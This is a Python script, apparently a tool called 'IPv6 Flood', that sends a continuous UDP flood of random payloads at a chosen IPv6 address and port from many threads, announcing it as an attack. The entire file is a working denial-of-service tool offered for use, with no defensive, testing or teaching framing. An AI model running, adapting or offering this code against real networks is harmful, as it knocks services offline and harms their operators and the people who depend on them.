import socket
import random
import threading
import sys
import time

RED = '\033[91m'
GREEN = '\033[92m'
WHITE = '\033[97m'
RESET = '\033[0m'

def banner():
    print(f"{GREEN}"
          "+-+-+-+-+-+ +-+-+-+-+-+\n"
          "| I|P|v|6|  |F|l|o|o|d |\n"
          "+-+-+-+-+-+ +-+-+-+-+-+\n"
          "|       by Sheikh      |\n"
          "+----------------------+"
          f"{RESET}")

def flood(target, port, thread_id, payload_size, stop_event):
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    payload = random._urandom(payload_size)

    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target, port))
            print(f"{GREEN}[Thread {thread_id}] Flooding {target}:{port} with payload size {payload_size}{RESET}")
        except socket.error as e:
            print(f"{RED}[Thread {thread_id}] Socket error: {e}{RESET}")
            break
        except Exception as e:
            print(f"{RED}[Thread {thread_id}] Error: {e}{RESET}")

def main():
    if len(sys.argv) != 5:
        print(f"{RED}Usage: python3 ipv6_flood.py <target_ipv6> <port> <threads> <payload_size>{RESET}")
        sys.exit()

    target = sys.argv[1]
    port = int(sys.argv[2])
    threads = int(sys.argv[3])
    payload_size = int(sys.argv[4])

    if threads <= 0:
        print(f"{RED}Error: Number of threads must be greater than 0.{RESET}")
        sys.exit()
    if payload_size <= 0 or payload_size > 65507:
        print(f"{RED}Error: Payload size must be between 1 and 65507 bytes.{RESET}")
        sys.exit()

    try:
        socket.inet_pton(socket.AF_INET6, target)
    except socket.error:
        print(f"{RED}Error: Invalid IPv6 address.{RESET}")
        sys.exit()

    banner()
    print(f"{WHITE}Starting continuous attack on {target}:{port} with {threads} threads and payload size {payload_size}!{RESET}")

    stop_event = threading.Event()

    for i in range(threads):
        thread = threading.Thread(target=flood, args=(target, port, i + 1, payload_size, stop_event))
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"{WHITE}Stopping the attack...{RESET}")
        stop_event.set()

if __name__ == '__main__':
    main()
